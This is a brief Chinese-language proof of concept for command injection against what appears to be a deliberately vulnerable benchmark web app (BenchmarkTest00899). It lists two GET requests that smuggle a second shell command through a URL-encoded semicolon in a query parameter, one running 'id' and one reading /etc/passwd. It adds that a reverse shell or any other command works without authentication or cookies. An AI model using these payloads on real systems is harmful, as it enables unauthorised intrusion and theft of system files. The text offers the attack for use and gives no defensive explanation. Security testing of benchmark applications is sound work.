# 命令执行（id）：
GET /benchmark/cmdi-00/BenchmarkTest00899?BenchmarkTest00899=test%3Bid

# 读取任意文件（/etc/passwd）：
GET /benchmark/cmdi-00/BenchmarkTest00899?BenchmarkTest00899=test%3Bcat%20/etc/passwd

# 反弹 shell 等任意命令均可。无需鉴权，无需Cookie。